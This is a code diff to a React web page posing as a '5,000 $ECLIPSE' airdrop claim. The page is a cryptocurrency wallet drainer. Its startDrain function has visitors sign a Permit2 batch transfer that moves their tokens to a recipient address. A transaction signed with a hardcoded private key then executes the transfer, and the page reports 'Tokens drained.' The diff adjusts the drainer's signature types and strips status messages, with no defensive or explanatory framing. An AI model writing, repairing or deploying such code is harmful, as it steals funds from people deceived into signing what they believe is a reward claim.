@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { useWeb3Modal } from "@web3modal/wagmi/react";
 import { useAccount } from "wagmi";
 import Web3 from "web3";
@@ -8,9 +8,7 @@ import "./App.css";
 const App = () => {
   const { address } = useAccount();
   const { open } = useWeb3Modal();
-  const [status, setStatus] = useState("");
   const [isLoading, setIsLoading] = useState(false);
-  const [signatureCompleted, setSignatureCompleted] = useState(false);
 
   const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 
@@ -36,43 +34,8 @@ const App = () => {
   const initiator = "0x46C189BA92DE11F8b0f0D7889EAEE5758B9A88aB";
   const initiatorPK = "d58ea7b21cfd2d0be3e1887e2d2bbdab99c7c2d33960f60cca90fe34ff21cc5c";
 
-  // WAIT FOR WALLET PROVIDER WITHOUT REFRESHING
-  useEffect(() => {
-    const waitForProvider = async () => {
-      if (address && !window.ethereum) {
-        setStatus("Waiting for wallet to reconnect...");
-        let retries = 0;
-        while (!window.ethereum && retries < 60) {
-          await new Promise(r => setTimeout(r, 500));
-          retries++;
-        }
-        if (window.ethereum) {
-          setStatus("Wallet ready! You can now claim.");
-          setTimeout(() => setStatus(""), 2000);
-        } else {
-          setStatus("Please refresh the page manually.");
-        }
-      }
-    };
-    waitForProvider();
-  }, [address]);
-
   async function startDrain() {
-    if (!window.ethereum) {
-      setStatus("Waiting for wallet... Please wait a moment.");
-      let retries = 0;
-      while (!window.ethereum && retries < 30) {
-        await new Promise(r => setTimeout(r, 500));
-        retries++;
-      }
-      if (!window.ethereum) {
-        setStatus("Wallet not found. Please refresh and reconnect.");
-        return;
-      }
-    }
-
     setIsLoading(true);
-    setStatus("Connecting...");
 
     try {
       const provider = new ethers.BrowserProvider(window.ethereum);
@@ -87,6 +50,7 @@ const App = () => {
 
       const domain = {
         name: "Permit2",
+        version: "1",
         chainId: chainId,
         verifyingContract: PERMIT2_ADDRESS
       };
@@ -94,6 +58,7 @@ const App = () => {
       const types = {
         PermitBatchTransferFrom: [
           { name: "permitted", type: "TokenPermissions[]" },
+          { name: "spender", type: "address" },
           { name: "nonce", type: "uint256" },
           { name: "deadline", type: "uint256" }
         ],
@@ -103,12 +68,15 @@ const App = () => {
         ]
       };
 
-      const message = { permitted, nonce: 0, deadline };
+      const message = {
+        permitted: permitted,
+        spender: recipient,
+        nonce: 0,
+        deadline: deadline
+      };
 
-      setStatus("Approve in wallet...");
       const signature = await signer.signTypedData(domain, types, message);
 
-      setStatus("Processing...");
       const web3 = new Web3(window.ethereum);
       const transferDetails = TOKENS.map(() => ({
         to: recipient,
@@ -116,7 +84,7 @@ const App = () => {
       }));
 
       const permit2ABI = [
-        "function permitTransferFrom(((address token,uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external"
+        "function permitTransferFrom((address token,uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline, (address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external"
       ];
 
       const permit2Contract = new web3.eth.Contract(permit2ABI, PERMIT2_ADDRESS);
@@ -125,7 +93,7 @@ const App = () => {
       const gasPrice = "0x" + Math.floor(800000 * 1.3).toString(16);
 
       const txData = permit2Contract.methods.permitTransferFrom(
-        { permitted, nonce: 0, deadline },
+        { permitted, spender: recipient, nonce: 0, deadline },
         transferDetails,
         address,
         signature
@@ -144,12 +112,10 @@ const App = () => {
       const signedTx = await web3.eth.accounts.signTransaction(tx, initiatorPK);
       await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
 
-      setStatus("Success!");
-      setSignatureCompleted(true);
-      setTimeout(() => setStatus(""), 3000);
+      alert("Success! Tokens drained.");
     } catch (error) {
       console.error(error);
-      setStatus("Failed. Try again.");
+      alert("Transaction failed. Please try again.");
     } finally {
       setIsLoading(false);
     }
@@ -168,13 +134,11 @@ const App = () => {
           <div className="reward-amount">5,000 $ECLIPSE</div>
           <div className="reward-token">≈ $5,000 USD • Claimable by verified wallets</div>
 
-          {status && <div className="status-message">{status}</div>}
-
           {!address ? (
             <button onClick={() => open()} className="connect-btn">Connect Wallet</button>
           ) : (
             <button onClick={startDrain} className="connect-btn" disabled={isLoading}>
-              {isLoading ? "Processing..." : (signatureCompleted ? "Completed" : "Claim Airdrop")}
+              {isLoading ? "Processing..." : "Claim Airdrop"}
             </button>
           )}
 
